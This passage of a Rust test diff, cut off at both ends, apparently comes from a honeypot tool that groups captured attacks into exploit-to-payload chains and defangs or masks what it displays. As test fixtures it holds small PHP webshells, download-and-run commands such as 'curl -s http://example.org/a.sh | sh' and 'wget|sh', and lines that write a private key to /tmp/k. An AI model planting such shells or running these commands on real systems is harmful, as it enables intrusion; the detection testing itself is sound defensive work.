+            .find(|l| l.sources > 1)
+            .expect("the rest's list");
+        assert_eq!((rest.sources, rest.joiners.len()), (600 - LISTS_PER_IP, 10));
+        let pairs = joiner_pairs(&mut c).await.unwrap();
+        // Once each, however many bodies: at most 10 * 9 / 2.
+        let of_11 = pairs.iter().filter(|p| p.ip == 11).count();
+        assert!((40..=45).contains(&of_11), "{of_11}");
+        let p = plan(&mut c).await.unwrap();
+        assert_eq!(p.chains.len(), 1);
+        assert_eq!(p.chains[0].sources, 601);
+    }
+
+    #[tokio::test]
+    async fn sending_one_list_again_costs_a_count() {
+        let (s, _d) = store().await;
+        let a = sight(&s, STAGER_A, ("request", 0), 10).await;
+        for id in 1..2_000 {
+            sight(&s, STAGER_A, ("request", id), 10).await;
+        }
+        let mut c = s.pool.acquire().await.unwrap();
+        let lists = joiner_lists(&mut c).await.unwrap();
+        assert_eq!(lists.len(), 1);
+        assert_eq!(
+            (lists[0].sources, lists[0].joiners.clone()),
+            (2_000, vec![a])
+        );
+        let p = plan(&mut c).await.unwrap();
+        assert_eq!(p.chains[0].sources, 2_000);
+    }
+
+    #[tokio::test]
+    async fn fresh_describers_stop_at_their_cap() {
+        let (s, _d) = store().await;
+        sight(&s, STAGER_A, ("request", 1), 10).await;
+        let over = DESCRIBERS_MAX as i64 + 40;
+        sqlx::query(
+            "WITH RECURSIVE c(i) AS (SELECT 0 UNION ALL SELECT i + 1 FROM c WHERE i + 1 < ?1)
+             INSERT INTO pieces (hash, kind, value, first_seen, last_seen, ips, sources)
+             SELECT i + 1000, 'tag', 't' || i, ?2, ?2, 0, 0 FROM c",
+        )
+        .bind(over)
+        .bind(T0)
+        .execute(&s.pool)
+        .await
+        .unwrap();
+        sqlx::query(
+            "WITH RECURSIVE c(i) AS (SELECT 0 UNION ALL SELECT i + 1 FROM c WHERE i + 1 < ?1)
+             INSERT INTO piece_sightings
+             SELECT i + 1000, 'request', 1, 10, 'tag', 'claimed', ?2 FROM c",
+        )
+        .bind(over)
+        .bind(T0)
+        .execute(&s.pool)
+        .await
+        .unwrap();
+        let mut c = s.pool.acquire().await.unwrap();
+        let p = plan(&mut c).await.unwrap();
+        assert_eq!(p.members.len(), DESCRIBERS_MAX + 1);
+    }
+
+    /// `n` sources of `piece` from `ip`, numbered from `first`, at `ts`.
+    async fn sightings(s: &Store, piece: i64, first: i64, n: i64, ip: i64, ts: &str) {
+        sqlx::query(
+            "WITH RECURSIVE c(i) AS (SELECT 0 UNION ALL SELECT i + 1 FROM c WHERE i + 1 < ?1)
+             INSERT INTO piece_sightings
+             SELECT ?2, 'request', ?3 + i, ?4, 'stager', 'claimed', ?5 FROM c",
+        )
+        .bind(n)
+        .bind(piece)
+        .bind(first)
+        .bind(ip)
+        .bind(ts)
+        .execute(&s.pool)
+        .await
+        .unwrap();
+    }
+
+    #[tokio::test]
+    async fn a_chain_reads_its_newest_sources_and_a_piece_past_them_keeps_its_count() {
+        let (s, _d) = store().await;
+        let a = sight(&s, STAGER_A, ("request", 1), 10).await;
+        let recipe = sight(&s, RECIPE, ("request", 1), 10).await;
+        sightings(&s, a, 1_000, TAG_SOURCES_MAX, 10, T1).await;
+        run(&s).await;
+        let sources = {
+            let mut c = s.read.acquire().await.unwrap();
+            newest_sources(&mut c, &key_of(a)).await.unwrap()
+        };
+        assert_eq!(sources.len(), TAG_SOURCES_MAX as usize);
+        assert!(!sources.contains(&(REQUEST, 1)), "the oldest goes");
+        let chain = s.chain_by_key(&key_of(a)).await.unwrap().unwrap();
+        let row = one(&chain, "Command");
+        assert_eq!(row.piece, Some(recipe));
+        assert_eq!(row.requests, 1, "its own count, not 0");
+    }
+
+    #[tokio::test]
+    async fn sources_merge_across_joiners() {
+        let (s, _d) = store().await;
+        sight(&s, STAGER_A, ("request", 1), 10).await;
+        sight(&s, STAGER_B, ("request", 2), 11).await;
+        // Connected through two addresses naming both.
+        for (id, ip) in [(3, 10), (4, 11)] {
+            sight(&s, STAGER_A, ("request", id), ip).await;
+            sight(&s, STAGER_B, ("request", id), ip).await;
+        }
+        run(&s).await;
+        let mut c = s.read.acquire().await.unwrap();
+        let key = sqlx::query_scalar::<_, String>("SELECT key FROM chains")
+            .fetch_one(&mut *c)
+            .await
+            .unwrap();
+        let sources = newest_sources(&mut c, &key).await.unwrap();
+        assert_eq!(sources.len(), 4);
+        assert!(sources.contains(&(REQUEST, 1)) && sources.contains(&(REQUEST, 2)));
+    }
+
+    #[tokio::test]
+    async fn a_request_counts_chains_past_the_cap() {
+        let (s, _d) = store().await;
+        let request = s.upsert_ip(UPLOADER.parse().unwrap()).await.unwrap();
+        let (id, _) = sighted(&s, UPLOADER, "/many", &[]).await;
+        for j in 0..CHAINS_MAX as i64 + 3 {
+            let value = format!("h{j}.example.org");
+            let stager = ("stager", value.as_str(), "stager");
+            sight(&s, stager, ("request", id), request.id).await;
+            // Another address keeps it: this one holds its newest 16.
+            sight(&s, stager, ("request", id + 1 + j), request.id + 1 + j).await;
+        }
+        run(&s).await;
+        assert_eq!(
+            s.chains_of_request(id).await.unwrap(),
+            CHAINS_MAX as i64 + 3
+        );
+        assert_eq!(
+            s.chains_of(Anchor::Request(id)).await.unwrap().len(),
+            CHAINS_MAX
+        );
+    }
+
+    #[tokio::test]
+    async fn the_list_says_external_where_a_result_is_all_there_is() {
+        let (s, _d) = store().await;
+        let a = sight(&s, STAGER_A, ("request", 1), 10).await;
+        run(&s).await;
+        let payload = async |s: &Store| {
+            let page = s.chains_page(1, ChainFilter::default()).await.unwrap();
+            page.items[0].payload
+        };
+        assert_eq!(payload(&s).await, Mark::Gap);
+        let result = crate::store::pieces::NewResult {
+            family: Some("mirai".into()),
+            ..Default::default()
+        };
+        s.add_piece_result(a, &result, "admin").await.unwrap();
+        assert_eq!(payload(&s).await, Mark::External);
+    }
+
+    #[tokio::test]
+    async fn store_plan_writes_more_than_a_batch() {
+        let (s, _d) = store().await;
+        let n = INSERT_BATCH as i64 + 1;
+        let rows: Vec<_> = (0..n).map(|j| at(j, (REQUEST, j), j, T0)).collect();
+        let p = Plan {
+            chains: connect(&rows),
+            members: (0..n).map(|j| (j as usize, j)).collect(),
+        };
+        let mut c = s.pool.acquire().await.unwrap();
+        store_plan(&mut c, &p).await.unwrap();
+        store_plan(&mut c, &p).await.unwrap();
+        drop(c);
+        assert_eq!(chains(&s).await.len(), n as usize);
+        let last = key_of(n - 1);
+        assert_eq!(pieces_of(&s, &last).await, [n - 1]);
+    }
+
+    #[tokio::test]
+    async fn file_over_the_cap_is_left_out() {
+        let (s, _d) = store().await;
+        assert_eq!(HARD_FANOUT_MAX, 50);
+        let (over, at_cap) = (("file", "11", "file"), ("file", "22", "file"));
+        // Were the file a joiner, it would fuse the two stagers.
+        let (mut a, mut b, mut left_out) = (0, 0, 0);
+        for i in 0..=HARD_FANOUT_MAX as i64 {
+            left_out = sight(&s, over, ("upload", i), i).await;
+            match i % 4 {
+                0 | 1 => a = sight(&s, STAGER_A, ("upload", i), i).await,
+                _ => b = sight(&s, STAGER_B, ("upload", i), i).await,
+            }
+        }
+        let mut kept = 0;
+        for i in 0..HARD_FANOUT_MAX as i64 {
+            kept = sight(&s, at_cap, ("upload", 1000 + i), i).await;
+        }
+        run(&s).await;
+        let n: i64 = sqlx::query_scalar("SELECT COUNT(*) FROM chain_pieces WHERE piece = ?")
+            .bind(left_out)
+            .fetch_one(&s.pool)
+            .await
+            .unwrap();
+        assert_eq!(n, 0, "over the cap");
+        assert_eq!(pieces_of(&s, &key_of(a)).await, [a]);
+        assert_eq!(pieces_of(&s, &key_of(b)).await, [b]);
+        assert_eq!(pieces_of(&s, &key_of(kept)).await, [kept], "at the cap");
+    }
+
+    #[tokio::test]
+    async fn other_roles_of_a_stager_piece_join_nothing() {
+        let (s, _d) = store().await;
+        // A URL piece is `stager` by kind whatever its role.
+        sight(
+            &s,
+            ("stager", "x.example.org", "queried"),
+            ("request", 1),
+            10,
+        )
+        .await;
+        sight(
+            &s,
+            ("stager", "y.example.org", "self-hosted"),
+            ("request", 1),
+            10,
+        )
+        .await;
+        run(&s).await;
+        assert!(chains(&s).await.is_empty());
+        // In a chain's source they are no describers either.
+        let a = sight(&s, STAGER_A, ("request", 1), 10).await;
+        run(&s).await;
+        assert_eq!(pieces_of(&s, &key_of(a)).await, [a]);
+    }
+
+    #[tokio::test]
+    async fn describers_attach_by_source_not_by_address() {
+        let (s, _d) = store().await;
+        let a = sight(&s, STAGER_A, ("request", 1), 10).await;
+        let r = sight(&s, RECIPE, ("request", 1), 10).await;
+        let t = sight(&s, ("tag", "cve_2024_4577", "tag"), ("request", 1), 10).await;
+        let e = sight(&s, ("exploit", "POST /x", "exploit"), ("request", 1), 10).await;
+        let p = sight(&s, ("shell-profile", "c99", "opaque"), ("request", 1), 10).await;
+        // The same address, another request.
+        sight(&s, ("recipe", "wget|sh", "recipe"), ("request", 2), 10).await;
+        run(&s).await;
+        assert_eq!(pieces_of(&s, &key_of(a)).await, sorted(vec![a, r, t, e, p]));
+        assert_eq!(chains(&s).await[0].4, 1, "one source");
+    }
+
+    /// A later request, stored as the trap stores it.
+    async fn request(
+        s: &Store,
+        ip: &str,
+        (method, path): (&str, &str),
+        status: i64,
+        answer: &str,
+        ts: &str,
+    ) -> i64 {
+        let ip_id = s.upsert_ip(ip.parse().unwrap()).await.unwrap().id;
+        s.insert_request(&NewRequest {
+            ip_id,
+            method: method.into(),
+            path: path.into(),
+            headers_json: "[]".into(),
+            labels_json: "[]".into(),
+            answer: Some(answer.into()),
+            status: Some(status),
+            ts: Some(ts.into()),
+            ..Default::default()
+        })
+        .await
+        .unwrap()
+    }
+
+    /// Pieces and chains from what is stored.
+    async fn pass(s: &Store) -> String {
+        extract(&s.pool).await.unwrap();
+        run(s).await;
+        use sha2::Digest;
+        let hex = data_encoding::HEXLOWER.encode(&sha2::Sha256::digest(FILE));
+        key_of(piece_hash("file", &hex))
+    }
+
+    fn ids(rows: Vec<TimelineRow>) -> Vec<i64> {
+        rows.into_iter().map(|r| r.id).collect()
+    }
+
+    const UPLOADER: &str = "203.0.113.5";
+    const OTHER: &str = "203.0.113.6";
+    const LATER: &str = "2999-01-01 00:00:00";
+    const SHELL: i64 = 200;
+
+    #[tokio::test]
+    async fn follow_ups_attach_through_the_file() {
+        let (s, _d) = store().await;
+        seed_upload(&s, UPLOADER, "/up/a.php", FILE).await;
+        // From another address, and to the file: it counts.
+        let r = request(&s, OTHER, ("GET", "/up/a.php"), SHELL, "webshell", LATER).await;
+        // From the uploader, and not to the file: it does not.
+        request(&s, UPLOADER, ("GET", "/noise.php"), 404, "default", LATER).await;
+        let key = pass(&s).await;
+        let mut c = s.pool.acquire().await.unwrap();
+        assert_eq!(ids(follow_ups(&mut c, &key).await.unwrap()), [r]);
+    }
+
+    #[tokio::test]
+    async fn two_uploads_at_one_path_show_a_follow_up_once() {
+        let (s, _d) = store().await;
+        seed_upload(&s, UPLOADER, "/up/a.php", FILE).await;
+        seed_upload(&s, OTHER, "/up/a.php", FILE).await;
+        let r = request(&s, OTHER, ("GET", "/up/a.php"), SHELL, "webshell", LATER).await;
+        let key = pass(&s).await;
+        let mut c = s.pool.acquire().await.unwrap();
+        assert_eq!(uploads_of(&mut c, &key).await.unwrap().len(), 2);
+        // The second upload was itself sent to the first one's path.
+        let got = ids(follow_ups(&mut c, &key).await.unwrap());
+        assert_eq!(got.len(), 2, "{got:?}");
+        assert_eq!(got[1], r);
+    }
+
+    #[tokio::test]
+    async fn root_webshell_rows_are_not_follow_ups() {
+        let (s, _d) = store().await;
+        for path in ["/", "/.env", "/up/a.php"] {
+            seed_upload(&s, UPLOADER, path, FILE).await;
+        }
+        request(&s, OTHER, ("GET", "/"), SHELL, "webshell", LATER).await;
+        request(&s, OTHER, ("GET", "/.env"), SHELL, "webshell", LATER).await;
+        // A POST is not what the decoy answers: this one is a real use.
+        let post = request(&s, OTHER, ("POST", "/.env"), SHELL, "webshell", LATER).await;
+        let real = request(&s, OTHER, ("GET", "/up/a.php"), SHELL, "webshell", LATER).await;
+        let key = pass(&s).await;
+        let mut c = s.pool.acquire().await.unwrap();
+        assert_eq!(uploads_of(&mut c, &key).await.unwrap().len(), 3);
+        assert_eq!(ids(follow_ups(&mut c, &key).await.unwrap()), [post, real]);
+    }
+
+    #[tokio::test]
+    async fn dead_end_is_a_404_for_the_file_within_60_seconds() {
+        let (s, _d) = store().await;
+        seed_upload(&s, UPLOADER, "/up/s.php", FILE).await;
+        sqlx::query("UPDATE uploads SET ts = ?")
+            .bind(T0)
+            .execute(&s.pool)
+            .await
+            .unwrap();
+        sqlx::query("UPDATE requests SET ts = ?")
+            .bind(T0)
+            .execute(&s.pool)
+            .await
+            .unwrap();
+        let get = |path| ("GET", path);
+        let at_60 = "2026-10-01 00:01:00";
+        let at_61 = "2026-10-01 00:01:01";
+        let at_30 = "2026-10-01 00:00:30";
+        let hit = request(&s, UPLOADER, get("/other/s.php"), 404, "default", at_60).await;
+        let near = request(&s, UPLOADER, get("/s.php"), 404, "default", at_30).await;
+        // Too late, someone else, found, not the name, before the upload.
+        request(&s, UPLOADER, get("/other/s.php"), 404, "default", at_61).await;
+        request(&s, OTHER, get("/other/s.php"), 404, "default", at_30).await;
+        request(&s, UPLOADER, get("/other/s.php"), 200, "default", at_30).await;
+        request(&s, UPLOADER, get("/other/xs.php"), 404, "default", at_30).await;
+        request(
+            &s,
+            UPLOADER,
+            get("/other/s.php"),
+            404,
+            "default",
+            "2026-09-30 23:59:59",
+        )
+        .await;
+        let key = pass(&s).await;
+        let mut c = s.pool.acquire().await.unwrap();
+        assert_eq!(ids(dead_ends(&mut c, &key).await.unwrap()), [near, hit]);
+    }
+
+    /// A request, stored and sighted as a body naming `pieces` would be.
+    async fn sighted(s: &Store, ip: &str, path: &str, pieces: &[(&str, &str, &str)]) -> (i64, i64) {
+        let id = request(s, ip, ("POST", path), 200, "default", T0).await;
+        let ip_id = s.upsert_ip(ip.parse().unwrap()).await.unwrap().id;
+        for &p in pieces {
+            sight(s, p, ("request", id), ip_id).await;
+        }
+        (id, ip_id)
+    }
+
+    fn seen(hash: i64) -> sqlx::query::Query<'static, sqlx::Sqlite, sqlx::sqlite::SqliteArguments> {
+        sqlx::query("UPDATE piece_sightings SET grade = 'seen' WHERE piece = ?").bind(hash)
+    }
+
+    #[test]
+    fn a_kind_with_no_source_is_left_out_of_the_condition() {
+        assert_eq!(
+            sources_in(&[(REQUEST, 1), (REQUEST, 2)]),
+            "(g.source_kind = 'request' AND g.source_id IN (1,2))"
+        );
+        assert!(sources_in(&[(REQUEST, 1), (UPLOAD, 2)]).contains(" OR "));
+        assert_eq!(sources_in(&[]), "0");
+    }
+
+    fn stage<'a>(c: &'a Chain, name: &str) -> &'a [StageRow] {
+        let s = c.stages.iter().find(|s| s.name == name).unwrap();
+        &s.rows
+    }
+
+    fn one<'a>(c: &'a Chain, name: &str) -> &'a StageRow {
+        match stage(c, name) {
+            [r] => r,
+            rows => panic!("{name}: {rows:?}"),
+        }
+    }
+
+    /// A campaign of these address ids, keyed `key`.
+    async fn campaign(s: &Store, key: &str, ips: &[i64]) {
+        sqlx::query(
+            "INSERT INTO campaigns (key, num, anchor_ip_id, size, first_seen, last_seen,
+               hard_edges, soft_edges, v, computed_at)
+             VALUES (?, 1, ?, 1, 't', 't', 0, 0, 1, 't')",
+        )
+        .bind(key)
+        .bind(ips[0])
+        .execute(&s.pool)
+        .await
+        .unwrap();
+        for ip in ips {
+            sqlx::query("INSERT INTO campaign_members (ip_id, campaign_key) VALUES (?, ?)")
+                .bind(ip)
+                .bind(key)
+                .execute(&s.pool)
+                .await
+                .unwrap();
+        }
+    }
+
+    const TAG: (&str, &str, &str) = ("tag", "cve_2024_4577", "tag");
+    const TAG_SELFREP: (&str, &str, &str) = ("tag", "cve_2024_4577.selfrep", "tag");
+    const EXPLOIT_A: (&str, &str, &str) = ("exploit", "POST /hello.world", "exploit");
+    const EXPLOIT_B: (&str, &str, &str) = ("exploit", "POST /", "exploit");
+
+    #[test]
+    fn stage_names_are_the_spec_s() {
+        let c = Chain {
+            key: None,
+            stages: stages(
+                &Parts {
+                    key: None,
+                    found: &[],
+                    tags: &[],
+                    uploads: &[],
+                    follow: &FollowUps::default(),
+                    results: &[],
+                },
+                &Here::default(),
+            ),
+            ips: 0,
+            sources: 0,
+            first_seen: String::new(),
+            last_seen: String::new(),
+            more: 0,
+        };
+        let names = c.stages.each_ref().map(|s| s.name);
+        assert_eq!(
+            names,
+            ["Exploit", "Command", "Delivery", "Payload", "Follow-up"]
+        );
+    }
+
+    #[tokio::test]
+    async fn same_chain_from_all_anchors() {
+        let (s, _d) = store().await;
+        let (id, ip) = sighted(&s, UPLOADER, "/a", &[STAGER_A, RECIPE]).await;
+        run(&s).await;
+        campaign(&s, UPLOADER, &[ip]).await;
+        let want = key_of(piece_hash(STAGER_A.0, STAGER_A.1));
+        for a in [
+            Anchor::Request(id),
+            Anchor::Ip(ip),
+            Anchor::Campaign(UPLOADER),
+            Anchor::Piece(piece_hash(STAGER_A.0, STAGER_A.1)),
+        ] {
+            let chains = s.chains_of(a).await.unwrap();
+            assert_eq!(chains.len(), 1, "{a:?}");
+            assert_eq!(chains[0].key.as_deref(), Some(want.as_str()), "{a:?}");
+            assert_eq!(stage(&chains[0], "Delivery").len(), 1, "{a:?}");
+        }
+    }
+
+    #[tokio::test]
+    async fn same_chain_from_an_upload() {
+        let (s, _d) = store().await;
+        let uid = seed_upload(&s, UPLOADER, "/up/a.php", FILE).await;
+        let key = pass(&s).await;
+        let chains = s.chains_of(Anchor::Upload(&uid)).await.unwrap();
+        assert_eq!(chains.len(), 1);
+        assert_eq!(chains[0].key.as_deref(), Some(key.as_str()));
+        assert!(one(&chains[0], "Delivery").here);
+        assert!(one(&chains[0], "Delivery").joiner);
+        assert_eq!(one(&chains[0], "Delivery").label, "s[.]php");
+    }
+
+    #[tokio::test]
+    async fn a_request_shows_the_chain_of_the_upload_it_carried() {
+        let (s, _d) = store().await;
+        let uid = seed_upload(&s, UPLOADER, "/up/a.php", FILE).await;
+        let key = pass(&s).await;
+        let mut c = s.pool.acquire().await.unwrap();
+        let carrier = uploads::get(&mut c, &uid)
+            .await
+            .unwrap()
+            .unwrap()
+            .request_id;
+        drop(c);
+        let chains = s
+            .chains_of(Anchor::Request(carrier.unwrap()))
+            .await
+            .unwrap();
+        assert_eq!(chains[0].key.as_deref(), Some(key.as_str()));
+        assert!(one(&chains[0], "Payload").here);
+    }
+
+    #[tokio::test]
+    async fn exploit_rows_group_by_tag_before_the_first_dot() {
+        let (s, _d) = store().await;
+        sighted(&s, UPLOADER, "/a", &[STAGER_A, TAG, EXPLOIT_A]).await;
+        sighted(&s, OTHER, "/b", &[STAGER_A, TAG_SELFREP, EXPLOIT_B]).await;
+        let bare = ("exploit", "POST /bare", "exploit");
+        let (id, _) = sighted(&s, OTHER, "/c", &[STAGER_A, bare]).await;
+        run(&s).await;
+        let chains = s.chains_of(Anchor::Request(id)).await.unwrap();
+        let rows = stage(&chains[0], "Exploit");
+        assert_eq!(rows.len(), 2, "{rows:?}");
+        assert_eq!(rows[0].label, "cve_2024_4577");
+        assert_eq!(rows[0].mark, Mark::Claimed, "a tag is the attacker's word");
+        assert!(rows[0].detail.contains("attacker's tag"), "{rows:?}");
+        assert!(rows[0].detail.contains("POST /hello[.]world"), "{rows:?}");
+        assert!(rows[0].detail.contains("POST /"), "{rows:?}");
+        assert_eq!(
+            rows[0].href.as_deref(),
+            Some("/admin/evidence/links/exploit-tag/cve_2024_4577")
+        );
+        // No tag: a row of its own, and this request's.
+        assert_eq!(rows[1].label, "POST /bare");
+        assert!(rows[1].here && !rows[0].here);
+    }
+
+    #[tokio::test]
+    async fn payload_is_a_gap_without_a_result() {
+        let (s, _d) = store().await;
+        let (id, _) = sighted(&s, UPLOADER, "/a", &[STAGER_A]).await;
+        run(&s).await;
+        let chains = s.chains_of(Anchor::Request(id)).await.unwrap();
+        let gap = one(&chains[0], "Payload");
+        assert_eq!(gap.mark, Mark::Gap);
+        assert_eq!(gap.piece, Some(piece_hash(STAGER_A.0, STAGER_A.1)));
+        assert_eq!(
+            gap.href.as_deref(),
+            Some("/admin/evidence/links/stager/a.example.org")
+        );
+        // No upload: nothing could have run.
+        let follow = one(&chains[0], "Follow-up");
+        assert_eq!(follow.mark, Mark::Gap);
+        assert!(follow.detail.contains("never ran here"), "{follow:?}");
+    }
+
+    #[tokio::test]
+    async fn result_fills_payload_for_the_whole_chain() {
+        use crate::store::pieces::NewResult;
+        let (s, _d) = store().await;
+        let (a, _) = sighted(&s, UPLOADER, "/a", &[STAGER_A]).await;
+        let (b, _) = sighted(&s, OTHER, "/b", &[STAGER_A]).await;
+        run(&s).await;
+        let h = piece_hash(STAGER_A.0, STAGER_A.1);
+        let new = NewResult {
+            family: Some("Mirai".into()),
+            sha256: Some("ab".repeat(32)),
+            source_url: Some("https://example.org/report".into()),
+            ..Default::default()
+        };
+        s.add_piece_result(h, &new, "admin").await.unwrap();
+        s.add_piece_result(
+            h,
+            &NewResult {
+                sha256: Some("cd".repeat(32)),
+                ..Default::default()
+            },
+            "admin",
+        )
+        .await
+        .unwrap();
+        for id in [a, b] {
+            let chains = s.chains_of(Anchor::Request(id)).await.unwrap();
+            let rows = stage(&chains[0], "Payload");
+            assert_eq!(rows.len(), 2, "one row per result: {rows:?}");
+            assert!(rows.iter().all(|r| r.mark == Mark::External));
+            assert_eq!(rows[0].label, "Mirai");
+            assert!(rows[0].detail.contains("external"), "{:?}", rows[0]);
+            assert_eq!(rows[1].label, "sha256 cdcdcdcdcdcd");
+            assert_eq!(rows[0].piece, Some(h));
+        }
+    }
+
+    #[tokio::test]
+    async fn uploaded_text_fills_payload_as_seen() {
+        let (s, _d) = store().await;
+        let uid = seed_upload(&s, UPLOADER, "/up/a.php", FILE).await;
+        seed_upload(&s, OTHER, "/up/a.php", FILE).await;
+        pass(&s).await;
+        let chains = s.chains_of(Anchor::Upload(&uid)).await.unwrap();
+        let row = one(&chains[0], "Payload");
+        assert_eq!(row.mark, Mark::Seen);
+        assert_eq!(row.label, "s[.]php");
+        assert!(row.detail.contains("2 uploads"), "{row:?}");
+        assert!(
+            row.href
+                .as_deref()
+                .unwrap()
+                .starts_with("/admin/traps/uploads/")
+        );
+        assert!(row.here);
+        // Not held: the file is known, its text is not.
+        crate::store::uploads::forget_content(&s).await;
+        let chains = s.chains_of(Anchor::Upload(&uid)).await.unwrap();
+        assert_eq!(one(&chains[0], "Payload").mark, Mark::Gap);
+        assert_eq!(stage(&chains[0], "Delivery").len(), 1);
+    }
+
+    #[tokio::test]
+    async fn binary_upload_leaves_a_gap() {
+        let (s, _d) = store().await;
+        let uid = seed_upload(&s, UPLOADER, "/up/a.php", FILE).await;
+        pass(&s).await;
+        sqlx::query("UPDATE uploads SET sniffed_type = 'elf'")
+            .execute(&s.pool)
+            .await
+            .unwrap();
+        let chains = s.chains_of(Anchor::Upload(&uid)).await.unwrap();
+        let gap = one(&chains[0], "Payload");
+        assert_eq!(gap.mark, Mark::Gap);
+        assert!(
+            gap.href.as_deref().unwrap().contains("/links/file/"),
+            "{gap:?}"
+        );
+    }
+
+    #[tokio::test]
+    async fn dead_end_shows_in_follow_up() {
+        let (s, _d) = store().await;
+        let uid = seed_upload(&s, UPLOADER, "/up/s.php", FILE).await;
+        for table in ["UPDATE uploads SET ts = ?", "UPDATE requests SET ts = ?"] {
+            sqlx::query(table).bind(T0).execute(&s.pool).await.unwrap();
+        }
+        let path = ("GET", "/other/s.php");
+        let at_30 = "2026-10-01 00:00:30";
+        let hit = request(&s, UPLOADER, path, 404, "default", at_30).await;
+        pass(&s).await;
+        let chains = s.chains_of(Anchor::Upload(&uid)).await.unwrap();
+        let row = one(&chains[0], "Follow-up");
+        assert_eq!(row.mark, Mark::DeadEnd);
+        assert_eq!(row.label, "GET /other/s[.]php");
+        assert!(row.detail.contains("404 within 60 seconds"), "{row:?}");
+        assert_eq!(row.href, Some(format!("/admin/requests/{hit}")));
+    }
+
+    #[tokio::test]
+    async fn follow_ups_show_as_seen_once_per_request() {
+        let (s, _d) = store().await;
+        seed_upload(&s, UPLOADER, "/up/a.php", FILE).await;
+        let shell = ("GET", "/up/a.php");
+        request(&s, OTHER, shell, SHELL, "webshell", LATER).await;
+        let last = request(&s, OTHER, shell, SHELL, "webshell", LATER).await;
+        let key = pass(&s).await;
+        let chains = s.chains_of(Anchor::Request(last)).await.unwrap();
+        // A request with no piece of its own has no strip, though it used
+        // the file; the upload's chain has it.
+        assert!(chains.is_empty());
+        let file = key_piece(&key).unwrap();
+        let chains = s.chains_of(Anchor::Piece(file)).await.unwrap();
+        let rows = stage(&chains[0], "Follow-up");
+        let row = rows.iter().find(|r| r.label == "GET /up/a[.]php").unwrap();
+        assert_eq!(row.mark, Mark::Seen);
+        assert_eq!(row.detail, "2 requests · webshell 200");
+    }
+
+    /// A request to `path` with this query and body.
+    async fn sent(s: &Store, path: &str, query: Option<&str>, body: Option<&[u8]>) -> i64 {
+        let ip_id = s.upsert_ip(OTHER.parse().unwrap()).await.unwrap().id;
+        s.insert_request(&NewRequest {
+            ip_id,
+            method: "POST".into(),
+            path: path.into(),
+            query: query.map(Into::into),
+            body: body.map(<[u8]>::to_vec),
+            headers_json: "[]".into(),
+            labels_json: "[]".into(),
+            answer: Some("webshell".into()),
+            status: Some(SHELL),
+            ts: Some(LATER.into()),
+            ..Default::default()
+        })
+        .await
+        .unwrap()
+    }
+
+    async fn pieces_pass(s: &Store) {
+        extract(&s.pool).await.unwrap();
+        run(s).await;
+    }
+
+    /// The Follow-up rows of `uid`'s chain.
+    async fn follow_rows(s: &Store, uid: &str) -> Vec<StageRow> {
+        let chains = s.chains_of(Anchor::Upload(uid)).await.unwrap();
+        stage(&chains[0], "Follow-up").to_vec()
+    }
+
+    const SHELL_GET: &[u8] = b"<?php system($_GET['tool']); echo 'a shell of 32 bytes or so'; ?>";
+
+    #[tokio::test]
+    async fn a_follow_up_shows_the_command_its_shell_reads() {
+        let (s, _d) = store().await;
+        let uid = seed_upload(&s, UPLOADER, "/up/a.php", SHELL_GET).await;
+        let by_query = "tool=wget+http%3A%2F%2Fexample.org%2Fx";
+        sent(&s, "/up/a.php", Some(by_query), None).await;
+        // Not the shell's input: `cmd` means nothing to this one.
+        sent(&s, "/up/a.php", Some("cmd=id"), None).await;
+        pieces_pass(&s).await;
+        let rows = follow_rows(&s, &uid).await;
+        let row = rows
+            .iter()
+            .find(|r| r.label.starts_with("wget"))
+            .expect("read");
+        assert_eq!(row.label, "wget hxxp://example[.]org/x");
+        assert_eq!(row.detail, "1 request · webshell 200 · POST /up/a[.]php");
+        assert!(
+            rows.iter().any(|r| r.label == "POST /up/a[.]php?cmd=id"),
+            "{rows:?}"
+        );
+    }
+
+    #[tokio::test]
+    async fn a_follow_up_reads_a_posted_or_raw_input() {
+        let (s, _d) = store().await;
+        let php = b"<?php system($_POST['c']); echo 'a shell of 32 bytes or so'; ?>";
+        let uid = seed_upload(&s, UPLOADER, "/up/a.php", php).await;
+        sent(&s, "/up/a.php", None, Some(b"c=uname+-a")).await;
+        pieces_pass(&s).await;
+        assert!(
+            follow_rows(&s, &uid)
+                .await
+                .iter()
+                .any(|r| r.label == "uname -a")
+        );
+        let raw = b"<?php eval(file_get_contents('php://input')); echo 'padding'; ?>";
+        let uid = seed_upload(&s, UPLOADER, "/up/b.php", raw).await;
+        sent(&s, "/up/b.php", None, Some(b"echo hello")).await;
+        pieces_pass(&s).await;
+        assert!(
+            follow_rows(&s, &uid)
+                .await
+                .iter()
+                .any(|r| r.label == "echo hello")
+        );
+    }
+
+    #[tokio::test]
+    async fn a_follow_up_with_no_profile_shows_its_recipe() {
+        let (s, _d) = store().await;
+        let uid = seed_upload(&s, UPLOADER, "/up/a.php", FILE).await;
+        let body = b"curl -s http://example.org/a.sh | sh";
+        sent(&s, "/up/a.php", None, Some(body)).await;
+        pieces_pass(&s).await;
+        let x = parse(
+            Source::Request {
+                method: "POST",
+                path: "/up/a.php",
+                query: None,
+                body: Some(body),
+                sender: None,
+            },
+            Policy::embedded(),
+        );
+        let want = compact_recipe(&x.recipes[0].normal);
+        assert_eq!(want, "curl → sh");
+        let rows = follow_rows(&s, &uid).await;
+        assert!(rows.iter().any(|r| r.label == want), "{want}: {rows:?}");
+    }
+
+    #[tokio::test]
+    async fn a_follow_up_never_shows_a_private_key() {
+        let (s, _d) = store().await;
+        let uid = seed_upload(&s, UPLOADER, "/up/s.php", SHELL_GET).await;
+        let pem =
+            "-----BEGIN OPENSSH PRIVATE KEY-----\nQUJDREVG\n-----END OPENSSH PRIVATE KEY-----";
+        let plain = crate::admin::public::urlencode(&format!("echo '{pem}' > /tmp/k"));
+        let hidden = data_encoding::BASE64.encode(pem.as_bytes());
+        let hidden =
+            crate::admin::public::urlencode(&format!("echo {hidden} | base64 -d > /tmp/k"));
+        let (a, b) = (format!("tool={plain}"), format!("tool={hidden}"));
+        sent(&s, "/up/s.php", Some(&a), None).await;
+        sent(&s, "/up/s.php", Some(&b), None).await;
+        // A dead end's query is not read at all, and its path is masked.
+        let key_path = format!("/x{}/s.php", crate::admin::public::urlencode(pem));
+        for table in ["UPDATE uploads SET ts = ?", "UPDATE requests SET ts = ?"] {
+            sqlx::query(table).bind(T0).execute(&s.pool).await.unwrap();
+        }
+        let at_30 = "2026-10-01 00:00:30";
+        request(&s, UPLOADER, ("GET", &key_path), 404, "default", at_30).await;
+        pieces_pass(&s).await;
+        let rows = follow_rows(&s, &uid).await;
+        assert!(rows.len() >= 2, "{rows:?}");
+        for r in &rows {
+            let text = format!("{} {}", r.label, r.detail);
